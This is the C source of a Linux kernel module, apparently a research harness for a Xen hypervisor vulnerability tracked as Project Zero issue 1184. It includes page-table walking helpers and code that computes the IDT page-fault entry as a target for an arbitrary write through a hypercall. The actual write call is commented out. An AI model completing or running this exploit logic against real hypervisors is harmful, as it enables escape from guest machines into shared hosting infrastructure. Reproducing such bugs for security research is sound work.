#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <asm/xen/page.h>
#include <asm/xen/hypercall.h> 
#include <linux/sched.h>  

unsigned long call_xen_memory_op(unsigned long op, void *argp);
unsigned long call_xen_update_va_mapping(void *virt, unsigned long pte, unsigned long flags);
unsigned long read_idt_addr(void);

#define INTERRUPT_PAGEFAULT 14

#define PMD_FLAG (_PAGE_RW | _PAGE_USER | _PAGE_ACCESSED | _PAGE_DIRTY | _PAGE_PRESENT)
#define PTE_FLAG PMD_FLAG
#define PADDR_BITS 44
#define PADDR_MASK ((1ULL << PADDR_BITS)-1)
#define pg_entry(__pgd, i) ((__pgd) + i)
#define pgd_to_mfn(__pgd) ((__pgd->pgd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pud_to_mfn(__pud) ((__pud->pud & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pmd_to_mfn(__pmd) ((__pmd->pmd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pte_to_mfn(__pte) ((__pte->pte & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define no_reserved_bits(x) ((x & (1<<7)) | ( (x>>43) & 127))

#define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)

void page_walk(unsigned long va)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	struct mm_struct *mm = current->mm;

	pgd = pgd_offset(mm, va);
	pud = pud_offset(pgd, va);
	pmd = pmd_offset(pud, va);
	pte = pte_offset_kernel(pmd, va);
	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
}

pgd_t *get_pgd(unsigned long va)
{
	struct mm_struct *mm = current->mm;
	return pgd_offset(mm, va);
}

pud_t *get_pud(unsigned long va)
{
	return pud_offset(get_pgd(va), va);
}

pmd_t *get_pmd(unsigned long va)
{
	return pmd_offset(get_pud(va), va);
}

pte_t *get_pte(unsigned long va)
{
	return pte_offset_kernel(get_pmd(va), va);
}


struct task_struct *task;


static int init_test(void) {
  pr_warn("call_xen_memory_op is at %p\n", call_xen_memory_op);
  return 0;
}

/*
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1184
 */

static void cleanup_test(void) {
  u64 idt_addr, target_addr ;
  unsigned long ret, in_extent, in_extent_addr, in_extent_base, nr_exchanged;
  void *victim_page_virt;
  unsigned long idt_size, idt_base_addr;
  unsigned long read_value = -1;

  // hypervisor is lower than kernel, so hypervisor reference has to come first
  #define OUT_EXTENT_BASE_ADDR 0

  victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
  in_extent = virt_to_mfn(victim_page_virt);
  in_extent_addr = (unsigned long) &in_extent;

  idt_addr = read_idt_addr();
  pr_warn("IDT register value %llx\n", idt_addr);
  target_addr = idt_addr + 16 * INTERRUPT_PAGEFAULT;
  pr_warn("Write target address: 0x%llx\n", target_addr);

  if ((target_addr & 0x7) != 0) {
    pr_warn("target_addr misaligned\n");
    return;
  }

  nr_exchanged = (target_addr - OUT_EXTENT_BASE_ADDR) / 8;
  in_extent_base = in_extent_addr - (nr_exchanged * 8);
  pr_warn("in_extent_base: %lx\n", in_extent_base);
  pr_warn("The offset=%lx\n", (unsigned long) 
          OUT_EXTENT_BASE_ADDR + 8 *nr_exchanged);
  pr_warn("The intended write will happen on MFN=%lx\n", (unsigned long) in_extent_base +
          OUT_EXTENT_BASE_ADDR + 8 *nr_exchanged);


  pr_warn("Will write at linear address 0x%llx using the Injection hypercall\n", target_addr);
  //ret = HYPERVISOR_arbitrary_access(target_addr, &read_value,sizeof(read_value) , ARBITRARY_WRITE_LINEAR);
  ret = 0;

  pr_warn("Hypercall returned: %ld\n",ret);


}

module_init(init_test);
module_exit(cleanup_test);

MODULE_LICENSE("GPL v2");

